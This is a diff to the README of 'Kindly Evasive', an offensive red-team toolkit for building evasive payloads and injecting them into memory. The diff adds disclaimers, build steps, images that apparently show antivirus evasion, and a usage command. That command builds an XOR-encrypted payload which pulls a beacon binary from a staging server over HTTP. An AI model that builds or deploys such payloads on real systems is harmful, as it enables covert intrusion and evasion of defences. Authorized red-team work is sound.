@@ -1,7 +1,22 @@
 
+
 # Kindly Evasive
 
-**Kindly Evasive** is a post-exploitation and Initial Access Payload (IAP) toolkit designed for building and injecting payloads directly into memory. With its robust features, Kindly Evasive allows users to efficiently manage payloads, facilitating seamless operations during engagements.
+<div align="center">
+  <img src="assets/kindlyevasive.png" width="25%" /><br />
+</div>
+
+<div align="center">
+  <h1>Kindly Evasive</h1>
+  <br/>
+
+**Kindly Evasive** is a post-exploitation and Initial Access Payload (IAP) toolkit created by <a href="https://github.com/rottaj">@rottaj</a>
+<br> It's designed for building and injecting payloads directly into memory. It allows you to efficiently manage payloads, facilitating seamless operations during engagements.
+
+> :warning: The use of this tool for malicious purposes is illegal and unethical. Always ensure that you have explicit permission to use this tool in any environment.
+
+</div>
+
 
 ## Features
 
@@ -54,14 +69,15 @@
 1. Clone the repository:
    ```bash
    git clone https://github.com/rottaj/KindlyEvasive.git
-   cd kindly-evasive
+   cd KindlyEvasive 
    ```
 
 2. Install required dependencies (if any).
 
 3. Build the toolkit:
    ```bash
-   make build
+   cd KindlyBuilder
+   cmake 
    ```
 
 ## Usage
@@ -69,10 +85,23 @@
 To get started with Kindly Evasive, run the following command:
 
 ```bash
-./KindlyBuilder -h
+.\KindlyBuilder -h
+
+.\KindlyBuilder.exe --output-dir C:\Payloads\testing.exe --encryption-method XOR --remote-file http://192.168.1.124:8080/beacon_x64.bin 
+--payload-size 304128 --payload-type beacon --staging-server http://192.168.1.124:8080/ --chunk-count 3
 ```
 
-This command will provide you with all available options and configurations to tailor your payloads as needed.
+## KindlyEvasive in action
+
+:point_down: Some Gifs might take a some time to load.  :point_down:
+
+![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Delivery.gif?raw=true)
+![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Beaconing.gif?raw=true)
+![alt text](https://github.com/rottaj/KindlyEvasive/blob/main/assets/Defender.png?raw=true)
+
+## Disclaimer
+Use this software responsibly and only in environments where you have legal permission.<br>
+The author of this tool is not responsible for any misuse or damages caused.
 
 ## Contributing
 
